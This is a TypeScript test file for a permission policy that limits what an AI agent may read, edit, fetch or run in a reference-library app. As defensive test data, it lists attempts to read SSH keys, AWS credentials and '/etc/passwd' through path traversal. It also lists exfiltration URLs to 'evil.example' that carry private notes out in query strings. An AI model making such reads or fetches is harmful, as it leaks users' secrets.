import type { RequestPermissionRequest } from "@agentclientprotocol/sdk";
import { describe, expect, it } from "vitest";
import { citegeistTool, decide, pickOption } from "./policy.js";

type Ctx = Parameters<typeof decide>[1];

const ctx: Ctx = {
  mode: "chat",
  isolated: true,
  libraryRoot: "/lib",
  scratchDir: "/local/chats/ch_1/cwd",
};
/** A11: the user's own environment. */
const open: Ctx = { ...ctx, isolated: false };

const req = (
  toolCall: Partial<RequestPermissionRequest["toolCall"]>,
): RequestPermissionRequest => ({
  sessionId: "s",
  toolCall: { toolCallId: "c", ...toolCall },
  options: [
    { optionId: "a", name: "Allow", kind: "allow_once" },
    { optionId: "r", name: "Reject", kind: "reject_once" },
  ],
});

describe("citegeistTool", () => {
  it("reads the tool name from the usual spellings", () => {
    expect(citegeistTool({ name: "mcp__citegeist__add_item" })).toBe("add_item");
    expect(citegeistTool({ title: "citegeist - search (MCP)" })).toBe("search");
    expect(citegeistTool({ title: "mcp__citegeist__get_item" })).toBe("get_item");
    expect(
      citegeistTool({ title: "x", _meta: { claudeCode: { toolName: "mcp__citegeist__cite" } } }),
    ).toBe("cite");
  });

  it("does not mistake a file path for a tool", () => {
    expect(citegeistTool({ title: "Edit /Users/me/citegeist/notes.md" })).toBeUndefined();
    expect(citegeistTool({ name: "mcp__other__citegeist" })).toBeUndefined();
  });
});

describe("decide", () => {
  it("allows citegeist tools and read-only kinds", () => {
    expect(decide(req({ name: "mcp__citegeist__search", kind: "other" }), ctx).allow).toBe(true);
    expect(decide(req({ kind: "read", title: "Read file" }), ctx).allow).toBe(true);
    expect(decide(req({ kind: "fetch", title: "WebFetch" }), ctx).allow).toBe(true);
  });

  it("allows edits in the library's text areas and the scratch folder", () => {
    const edit = (path: string) => decide(req({ kind: "edit", locations: [{ path }] }), ctx).allow;
    expect(edit("/lib/notes/idee.md")).toBe(true);
    expect(edit("/lib/projects/phd/project.md")).toBe(true);
    expect(edit("/local/chats/ch_1/cwd/scratch.txt")).toBe(true);
  });

  it("rejects edits to derived data, sources, the manifest and anything outside", () => {
    const edit = (path: string) => decide(req({ kind: "edit", locations: [{ path }] }), ctx);
    expect(edit("/lib/items/a/derived/abc/doc.md").allow).toBe(false);
    expect(edit("/lib/items/a/sources/x.pdf").allow).toBe(false);
    expect(edit("/lib/citegeist.json").allow).toBe(false);
    expect(edit("/etc/hosts").allow).toBe(false);
    expect(edit("/lib/notes/../citegeist.json").allow).toBe(false);
    expect(decide(req({ kind: "edit" }), ctx)).toMatchObject({ allow: false });
  });

  it("rejects shell commands and unknown tools", () => {
    expect(decide(req({ kind: "execute", title: "Bash" }), ctx).allow).toBe(false);
    expect(decide(req({ kind: "other", title: "Mystery" }), ctx).allow).toBe(false);
    expect(decide(req({ kind: "switch_mode", title: "ExitPlanMode" }), ctx).allow).toBe(false);
  });

  it("lets an agent in the user's own environment use the shell and the user's tools (A11)", () => {
    expect(decide(req({ kind: "execute", title: "Bash" }), open).allow).toBe(true);
    expect(decide(req({ kind: "other", title: "mcp__github__create_issue" }), open).allow).toBe(
      true,
    );
    expect(decide(req({ kind: "edit", locations: [{ path: "/etc/hosts" }] }), open).allow).toBe(
      true,
    );
  });

  it("still protects derived data, sources and the manifest outside the sandbox", () => {
    const edit = (path: string) => decide(req({ kind: "edit", locations: [{ path }] }), open);
    expect(edit("/lib/items/a/derived/abc/doc.md").allow).toBe(false);
    expect(edit("/lib/items/a/sources/x.pdf").allow).toBe(false);
    expect(edit("/lib/citegeist.json").allow).toBe(false);
    expect(edit("/lib/notes/idee.md").allow).toBe(true);
  });

  it("does not open the shell for a research job even when the chat is not isolated", () => {
    const research: Ctx = { ...open, mode: "research" };
    expect(decide(req({ kind: "other", title: "Mystery" }), research).allow).toBe(false);
    expect(decide(req({ kind: "execute", title: "Bash" }), research).allow).toBe(false);
  });

  it("keeps research jobs on the inbox path of add_item", () => {
    const research: Ctx = { ...ctx, mode: "research" };
    const add = (rawInput: unknown) =>
      decide(req({ name: "mcp__citegeist__add_item", kind: "other", rawInput }), research);
    expect(add({ identifier: "10.1/x", why: "passt" }).allow).toBe(true);
    expect(add({ identifier: "10.1/x", why: "passt", target: "library" }).allow).toBe(false);
    expect(add({ identifier: "10.1/x" }).allow).toBe(false);
    expect(add({ identifier: "10.1/x", why: "  " }).allow).toBe(false);
    // Without arguments in the request there is nothing to check yet.
    expect(add(undefined).allow).toBe(true);
    // Research never edits files.
    expect(
      decide(req({ kind: "edit", locations: [{ path: "/lib/notes/a.md" }] }), research).allow,
    ).toBe(false);
  });
});

describe("reading outside the library", () => {
  const research: Ctx = { ...ctx, mode: "research" };
  const read = (path: string, c = ctx, kind: "read" | "search" = "read") =>
    decide(req({ kind, locations: [{ path }] }), c).allow;

  it("keeps the sandbox and research jobs inside the library and the scratch folder", () => {
    for (const c of [ctx, research]) {
      expect(read("/lib/items/a/a.md", c)).toBe(true);
      expect(read("/lib", c)).toBe(true);
      expect(read("/local/chats/ch_1/cwd/notes.txt", c)).toBe(true);
      expect(read("/Users/me/.ssh/id_ed25519", c)).toBe(false);
      expect(read("/Users/me/Library/Application Support/citegeist/lib1/core.token", c)).toBe(
        false,
      );
      expect(read("/lib/../etc/passwd", c)).toBe(false);
      expect(read("/lib/items/../../etc/passwd", c, "search")).toBe(false);
    }
    // A search names its folder in the raw input.
    const grep = (path: string) =>
      decide(req({ kind: "search", rawInput: { path, pattern: "x" } }), ctx).allow;
    expect(grep("/lib/notes")).toBe(true);
    expect(grep("/Users/me")).toBe(false);
    // A folder given relative to the working folder stays inside it; one that climbs out does not.
    expect(grep(".")).toBe(true);
    expect(grep("../../../../Users/me")).toBe(false);
    // The fixed part of a glob or pattern counts as a path.
    const glob = (pattern: string) =>
      decide(req({ kind: "search", rawInput: { pattern } }), ctx).allow;
    expect(glob("/lib/notes/**/*.md")).toBe(true);
    expect(glob("/Users/me/.ssh/*")).toBe(false);
    expect(glob("~/.aws/credentials")).toBe(false);
    expect(glob("**/*.md")).toBe(true);
    // No path in the request: nothing to check.
    expect(decide(req({ kind: "read", title: "Read file" }), research).allow).toBe(true);
  });

  it("lets the user's own environment read anywhere (A11)", () => {
    expect(read("/Users/me/Documents/paper.pdf", open)).toBe(true);
    // A research job stays closed even when the chat setting is open.
    expect(read("/Users/me/Documents/paper.pdf", { ...open, mode: "research" })).toBe(false);
  });
});

describe("local files in citegeist tool calls", () => {
  const research: Ctx = { ...ctx, mode: "research" };
  const tool = (name: string, rawInput: unknown, c = ctx) =>
    decide(req({ name: `mcp__citegeist__${name}`, kind: "other", rawInput }), c).allow;

  it("refuses a research job and the sandbox to add a file from elsewhere on the disk", () => {
    for (const id of [
      "/Users/me/Documents/taxes.pdf",
      "~/secret.html",
      "./x.epub",
      "file:///Users/me/a.pdf",
      "secret.pdf",
    ]) {
      expect(tool("add_item", { identifier: id, why: "w" }, research), id).toBe(false);
      expect(tool("add_item", { identifier: id }, ctx), id).toBe(false);
    }
    expect(tool("attach_file", { citekey: "a", path: "/Users/me/a.pdf" }, ctx)).toBe(false);
    expect(tool("attach_file", { citekey: "a", path: "/Users/me/a.pdf" }, research)).toBe(false);
  });

  it("still lets them add DOIs and URLs, and the sandbox use files of the library", () => {
    for (const id of [
      "10.1000/abc.pdf",
      "doi:10.1000/x",
      "https://doi.org/10.1000/x",
      "https://arxiv.org/abs/2401.00001",
      "arXiv:2401.1",
    ]) {
      expect(tool("add_item", { identifier: id, why: "w" }, research), id).toBe(true);
    }
    // Any web address is fine in the sandbox of a chat; a research job needs a scholarly host.
    expect(tool("add_item", { identifier: "https://example.org/a.pdf" }, ctx)).toBe(true);
    expect(tool("attach_file", { citekey: "a", path: "/local/chats/ch_1/cwd/a.pdf" }, ctx)).toBe(
      true,
    );
    // The user's own environment keeps the feature: the agent downloaded a PDF and adds it.
    expect(tool("add_item", { identifier: "/tmp/a.pdf" }, open)).toBe(true);
  });
});

describe("web access of a research job (L9, Agents Rule of Two)", () => {
  const research: Ctx = { ...ctx, mode: "research" };
  const fetchCall = (url: string) =>
    req({
      kind: "fetch",
      title: `Fetch ${url}`,
      rawInput: { url, prompt: "summarize" },
      _meta: { claudeCode: { toolName: "WebFetch" } },
    });
  const searchCall = (query: string) =>
    req({
      kind: "fetch",
      title: `Search "${query}"`,
      rawInput: { query },
      _meta: { claudeCode: { toolName: "WebSearch" } },
    });

  it("lets a research job search the web", () => {
    expect(decide(searchCall("retrieval practice older adults"), research).allow).toBe(true);
  });

  it("lets it open scholarly hosts and the addresses a search returned", () => {
    expect(decide(fetchCall("https://doi.org/10.1000/x"), research).allow).toBe(true);
    expect(decide(fetchCall("https://arxiv.org/abs/2401.00001?context=cs"), research).allow).toBe(
      true,
    );
    const seen = new Set(["https://example.org/papers/a"]);
    expect(
      decide(fetchCall("https://example.org/papers/a#abstract"), { ...research, seenUrls: seen })
        .allow,
    ).toBe(true);
  });

  it("refuses an address that the model composed, which could carry library content out", () => {
    for (const url of [
      "https://evil.example/collect?d=Sehr+vertrauliche+Notiz",
      "https://evil.example/",
      "http://arxiv.org/abs/1",
      "https://arxiv.org.evil.example/abs/1",
      "https://user:pw@arxiv.org/abs/1",
      "https://doi.org:8443/10.1/x",
    ]) {
      expect(decide(fetchCall(url), research).allow, url).toBe(false);
    }
    // Seen only once exactly: a variant with a query string is a new address.
    const seen = new Set(["https://example.org/papers/a"]);
    expect(
      decide(fetchCall("https://example.org/papers/a?d=secret"), { ...research, seenUrls: seen })
        .allow,
    ).toBe(false);
    const verdict = decide(fetchCall("https://evil.example/?q=x"), research);
    expect(verdict.reason).toMatch(/web search returned/);
  });

  it("refuses a fetch without a readable address in a research job and keeps chats open", () => {
    expect(decide(req({ kind: "fetch", title: "WebFetch" }), research).allow).toBe(false);
    expect(decide(fetchCall("https://evil.example/?q=x"), ctx).allow).toBe(true);
    expect(decide(fetchCall("https://evil.example/?q=x"), open).allow).toBe(true);
  });

  it("refuses add_item with a web address outside the scholarly hosts", () => {
    const add = (identifier: string) =>
      decide(
        req({
          name: "mcp__citegeist__add_item",
          kind: "other",
          rawInput: { identifier, why: "relevant" },
        }),
        research,
      );
    expect(add("https://evil.example/?q=Notiz").allow).toBe(false);
    expect(add("https://evil.example/?q=Notiz").reason).toMatch(/DOI/);
    expect(add("10.1000/x").allow).toBe(true);
    expect(add("https://doi.org/10.1000/x").allow).toBe(true);
  });
});

describe("pickOption", () => {
  const options = req({}).options;
  it("takes the matching one-time option", () => {
    expect(pickOption(options, true)?.optionId).toBe("a");
    expect(pickOption(options, false)?.optionId).toBe("r");
  });
  it("gives up when the agent offered no such option", () => {
    expect(
      pickOption([{ optionId: "a", name: "Allow", kind: "allow_once" }], false),
    ).toBeUndefined();
  });
});
